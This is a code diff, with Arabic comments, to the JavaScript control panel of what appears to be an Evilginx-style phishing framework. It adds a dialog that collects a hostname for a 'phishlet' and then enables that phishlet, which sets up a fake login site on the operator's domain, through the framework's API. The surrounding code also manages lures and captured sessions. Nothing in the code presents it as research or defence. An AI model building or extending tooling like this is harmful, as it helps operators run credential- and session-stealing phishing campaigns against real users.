@@ -237,25 +237,171 @@ async function fetchSessions() {
 // تفعيل أو تعطيل الـ Phishlet
 async function togglePhishlet(name, enable) {
     try {
+        // إذا كنا نحاول تفعيل الـ phishlet، نتحقق أولًا مما إذا كان له hostname مضبوط
+        if (enable) {
+            // الحصول على معلومات الـ phishlet
+            const phishletResponse = await fetch(`${API_BASE_URL}/phishlets/${name}`, {
+                method: 'GET',
+                headers: getHeaders()
+            });
+            
+            if (!phishletResponse.ok) {
+                throw {
+                    status: phishletResponse.status,
+                    message: `فشل في الحصول على معلومات الـ Phishlet`
+                };
+            }
+            
+            const phishletData = await phishletResponse.json();
+            console.log('بيانات الـ Phishlet:', phishletData);
+            
+            // إذا لم يكن للـ phishlet hostname، نسأل المستخدم عن إدخاله
+            if (!phishletData.data.hostname || phishletData.data.hostname === "") {
+                // عرض مودال لإدخال hostname
+                return new Promise((resolve) => {
+                    showHostnameModal(name, async (hostname) => {
+                        if (hostname) {
+                            // تحديث hostname للـ phishlet
+                            const updateResponse = await fetch(`${API_BASE_URL}/configs/hostname`, {
+                                method: 'POST',
+                                headers: getHeaders(),
+                                body: JSON.stringify({
+                                    phishlet: name,
+                                    hostname: hostname
+                                })
+                            });
+                            
+                            if (!updateResponse.ok) {
+                                showToast('خطأ', 'فشل في تحديث hostname للـ phishlet', 'error');
+                                resolve(false);
+                                return;
+                            }
+                            
+                            // الآن نحاول تفعيل الـ phishlet
+                            const success = await enablePhishlet(name);
+                            resolve(success);
+                        } else {
+                            // المستخدم ألغى العملية
+                            resolve(false);
+                        }
+                    });
+                });
+            }
+        }
+        
+        // إذا وصلنا إلى هنا، فإما أننا نعطل الـ phishlet أو أن الـ phishlet له hostname بالفعل
         const action = enable ? 'enable' : 'disable';
         const response = await fetch(`${API_BASE_URL}/phishlets/${name}/${action}`, {
             method: 'POST',
             headers: getHeaders()
         });
         
+        console.log(`استجابة ${enable ? 'تفعيل' : 'تعطيل'} الـ Phishlet:`, response);
+        
         if (!response.ok) {
+            // الحصول على تفاصيل الخطأ
+            const errorData = await response.json();
+            console.error('بيانات الخطأ:', errorData);
+            
             throw {
                 status: response.status,
-                message: `فشل في ${enable ? 'تفعيل' : 'تعطيل'} الـ Phishlet`
+                message: errorData.message || `فشل في ${enable ? 'تفعيل' : 'تعطيل'} الـ Phishlet`
             };
         }
         
-        showToast('تم بنجاح', `تم ${enable ? 'تفعيل' : 'تعطيل'} ${name} بنجاح`, 'success');
+        showToast('تم بنجاح', `تم ${enable ? 'تفعيل' : 'تعطيل'} الـ Phishlet ${name} بنجاح`, 'success');
         return true;
     } catch (error) {
+        console.error(`خطأ أثناء ${enable ? 'تفعيل' : 'تعطيل'} الـ Phishlet:`, error);
         handleApiError(error);
         return false;
     }
+}
+
+// وظيفة مساعدة لتفعيل الـ phishlet
+async function enablePhishlet(name) {
+    try {
+        const response = await fetch(`${API_BASE_URL}/phishlets/${name}/enable`, {
+            method: 'POST',
+            headers: getHeaders()
+        });
+        
+        console.log(`استجابة تفعيل الـ Phishlet:`, response);
+        
+        if (!response.ok) {
+            // الحصول على تفاصيل الخطأ
+            const errorData = await response.json();
+            console.error('بيانات الخطأ:', errorData);
+            
+            throw {
+                status: response.status,
+                message: errorData.message || `فشل في تفعيل الـ Phishlet`
+            };
+        }
+        
+        showToast('تم بنجاح', `تم تفعيل الـ Phishlet ${name} بنجاح`, 'success');
+        return true;
+    } catch (error) {
+        console.error(`خطأ أثناء تفعيل الـ Phishlet:`, error);
+        handleApiError(error);
+        return false;
+    }
+}
+
+// عرض نافذة مودال لإدخال hostname
+function showHostnameModal(phishletName, callback) {
+    // إنشاء عناصر المودال
+    const modal = document.createElement('div');
+    modal.className = 'modal active';
+    modal.innerHTML = `
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>إعداد Hostname للـ Phishlet</h3>
+                <button class="modal-close">&times;</button>
+            </div>
+            <div class="modal-body">
+                <p>يجب إدخال hostname لتفعيل الـ phishlet "${phishletName}"</p>
+                <div class="form-group">
+                    <label for="phishlet-hostname">Hostname</label>
+                    <input type="text" id="phishlet-hostname" class="form-control" placeholder="example.yourdomain.com">
+                    <small class="form-text">
+                        أدخل اسم النطاق الكامل الذي سيستخدم لهذا الـ phishlet. 
+                        تأكد من أن هذا النطاق مسجل ويشير إلى خادمك.
+                    </small>
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button class="btn-secondary modal-cancel-btn">إلغاء</button>
+                <button class="btn-primary modal-save-btn">حفظ وتفعيل</button>
+            </div>
+        </div>
+    `;
+    document.body.appendChild(modal);
+    
+    // إضافة معالجات الأحداث
+    const closeButtons = modal.querySelectorAll('.modal-close, .modal-cancel-btn');
+    closeButtons.forEach(button => {
+        button.addEventListener('click', function() {
+            document.body.removeChild(modal);
+            callback(null); // إلغاء العملية
+        });
+    });
+    
+    const saveButton = modal.querySelector('.modal-save-btn');
+    saveButton.addEventListener('click', function() {
+        const hostname = modal.querySelector('#phishlet-hostname').value.trim();
+        if (!hostname) {
+            showToast('خطأ', 'يجب إدخال hostname', 'error');
+            return;
+        }
+        document.body.removeChild(modal);
+        callback(hostname);
+    });
+    
+    // التركيز على حقل الإدخال
+    setTimeout(() => {
+        modal.querySelector('#phishlet-hostname').focus();
+    }, 100);
 }
 
 // إنشاء Lure جديد
